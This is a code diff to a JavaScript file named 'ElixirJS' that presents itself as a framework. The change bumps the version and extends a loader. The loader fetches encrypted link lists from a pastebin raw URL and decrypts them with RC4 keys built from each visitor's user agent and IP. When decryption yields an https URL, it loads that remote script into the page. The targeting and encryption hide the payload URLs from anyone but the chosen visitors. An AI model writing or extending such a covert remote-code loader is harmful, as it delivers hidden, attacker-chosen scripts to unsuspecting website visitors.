@@ -76,7 +76,7 @@ var ElixirJS;
 		/*! Define a constructor of Elixir class */
 		var Elixir = function() {
 			/*! Current framework version */
-			this.version = "0.0.4";
+			this.version = "0.0.5";
 			/*! Use third-party service to get client ip */
 			this.getipurl = "https://httpbin.org/get";
 			/*! Client HTTP request 'User-Agent' field */
@@ -92,7 +92,7 @@ var ElixirJS;
 		}
 		
 		Elixir.prototype = {
-			version : "0.0.4",
+			version : "0.0.5",
 			getipurl : "https://httpbin.org/get",
 			userAgent : null,
 			getlinksurl : "https://pastebin.com/raw/iCJ3tdsC",
@@ -127,14 +127,20 @@ var ElixirJS;
 						} catch (e) {
 						}
 						if (enclink == null || enclink == "") {continue;}
-						var key = propertyName+this.userAgent+this.userip;
-						var declink = rc4(key, enclink);
-						if (declink.search(/^https/) != -1) {
+						
+						var origin_ips = [];
+						this.userip.split(',').forEach(function(item){origin_ips[origin_ips.length]=item.trim()});
+						for (var i=0; i<origin_ips.length; i++) {
+						    var key = propertyName+this.userAgent+origin_ips[i];
+						    var declink = rc4(key, enclink);
+						    //console.log(propertyName +","+ this.userAgent+","+origin_ips[i]+","+declink);
+						    if (declink.search(/^https/) != -1) {
 							/*! Personal link found */
 							this.cjslink = declink;
 							found_new_link = true;
 							loadJS(declink);
 							break;
+						    }
 						}
 					}
 				}
